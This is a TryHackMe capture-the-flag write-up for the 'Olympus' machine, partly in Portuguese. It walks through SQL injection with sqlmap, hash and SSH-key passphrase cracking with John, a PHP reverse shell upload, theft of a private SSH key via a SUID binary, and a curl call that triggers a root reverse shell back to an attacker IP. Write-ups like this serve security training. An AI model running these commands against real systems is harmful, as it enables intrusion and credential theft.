
# TryHackMe: Olympus Write-up
**Name:** Olympus

**Difficulty:** Medium

**Category:** SQLi, SUID Abuse, Unrestricted File Upload, 

**IP:** 10.129.155.88

## Sumário Inicial
A máquina **Olympus** é um desafio de dificuldade média focado na enumeração web detalhada e na exploração de falhas de lógica de desenvolvimento. O vetor de entrada inicial (Initial Access) é obtido através de uma vulnerabilidade de SQL Injection (SQLi) numa barra de pesquisa, permitindo a extração de hashes de passwords e de logs de chat confidenciais. O acesso ao sistema (RCE) é alcançado explorando um mecanismo de upload de ficheiros inseguro, onde o algoritmo de renomeação "aleatória" de ficheiros era apenas um hash MD5 previsível. A fase de Pós-Exploração e Escalada de Privilégios obriga a um movimento lateral (pivot local via SSH) abusando de um binário SUID customizado (`cputils`) para roubar chaves privadas, culminando na descoberta e exploração de um *backdoor* deixado propositadamente no servidor para obter acesso `root`.

## 1. Reconnaissance
We started with a standard Nmap scan which revealed two open ports:
* **Port 22:** OpenSSH 8.2p1
* **Port 80:** Apache 2.4.41

Accessing the web server on port 80 redirected us to `http://olympus.thm`. After adding the domain to our `/etc/hosts` file, we accessed the main page which mentioned an old version of the website. 

Running Gobuster against `olympus.thm` revealed the `/~webmaster/` directory, which hosted a CMS website with nothing functional but a vulnerable search feature. 

## 2. Initial Access & SQL Injection
Testing the search bar with a basic payload (`' UNION SELECT 1,2,3-- -`) returned a column error, confirming it was vulnerable to SQL Injection. We intercepted the search request with Burp Suite, saved it to a `search.req` file, and passed it to SQLMap.

    sqlmap -r search.req -p search --dbs --batch

SQLMap successfully dumped the database. Digging into the `olympus` database, we dumped the `users`, `chats`, and `flag` tables.

**Loot Obtained:**
1. **Flag 1:** `flag{**********}`
2. **User Hashes:** Bcrypt hashes for `prometheus`, `root`, and `zeus`.
3. **Chat Logs:** Revealed a new subdomain (`chat.olympus.thm`) and detailed a file upload feature where filenames were obfuscated using a "random" function (which turned out to be MD5 hashing).

We cracked the `prometheus` hash using John the Ripper:

    echo '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C' > prom_hash.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt prom_hash.txt

**Credentials Found:** `prometheus` : `summertime`

## 3. Remote Code Execution (RCE)
After adding `chat.olympus.thm` to `/etc/hosts`, we logged in with our newly cracked credentials. We navigated to the file upload feature and uploaded a PHP reverse shell (`PentestMonkeyRevShell.php`). 

Instead of guessing the exact MD5 hash format the server used to rename the file, we leveraged our existing SQL injection to dump the `chats` table one more time. The database revealed our uploaded shell was saved as `312e7a4849313ed2837c1af2362a865c.php`.

Triggering the shell via `http://chat.olympus.thm/uploads/312e7a4849313ed2837c1af2362a865c.php` gave us a reverse shell as `www-data`. 

## 4. Lateral Movement to Zeus
In `/home/zeus/`, we found the user flag (`flag{****************}`) and a note from Prometheus hinting at a permanent root backdoor. 

Searching for SUID binaries revealed a custom executable:

    find / -perm -u=s -type f 2>/dev/null
    # Found: /usr/bin/cputils

This binary was owned by `zeus` and allowed file copying with Zeus's privileges, granting read access to the destination file. We used it to steal Zeus's private SSH key:

    /usr/bin/cputils
    # Source: /home/zeus/.ssh/id_rsa
    # Target: /tmp/id_rsa


We copied the key to our Kali machine and cracked its passphrase using `ssh2john` and John the Ripper:

`nano zeus_rsa`

`/usr/share/john/ssh2john.py zeus_rsa > zeus_hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt zeus_hash.txt`

* **Passphrase:** `snowflake`

Because external SSH connections were hanging (likely due to a firewall), we performed a local(in the taget machine) SSH pivot directly from our `www-data` shell:

    ssh -i /tmp/id_rsa zeus@localhost


## 5. Privilege Escalation to Root
As `zeus`, we could now traverse the hidden directory we previously found at `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/`. Inside, we found `VIGQFQFMYOST.php`, the root backdoor Prometheus mentioned.

Analyzing the PHP source code revealed it was a web shell relay that executed an SUID binary (`/lib/defended/libc.so.99`) to spawn a root shell. It required:
1. A POST parameter: `password=a7c5ffcf139742f52a5267c4a0674129`
2. GET parameters for the callback IP and port.

We fired the payload using `curl` while listening on Netcat:

    # On Target (as zeus):
    curl -X POST "http://localhost/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=192.168.130.184&port=5555" -d "password=a7c5ffcf139742f52a5267c4a0674129"


The reverse shell connected back as `root`. We retrieved the final flag from `/root/root.flag`.

## 6. Post-Exploitation (Bonus Flag)
The root flag contained a post-script hinting at one final hidden flag requiring Regex. We searched the `/etc` directory to find it:

    sudo find /etc -type f -exec grep -l 'flag{.*}' {} \; 2>/dev/null

This successfully located the bonus flag, completing the machine.
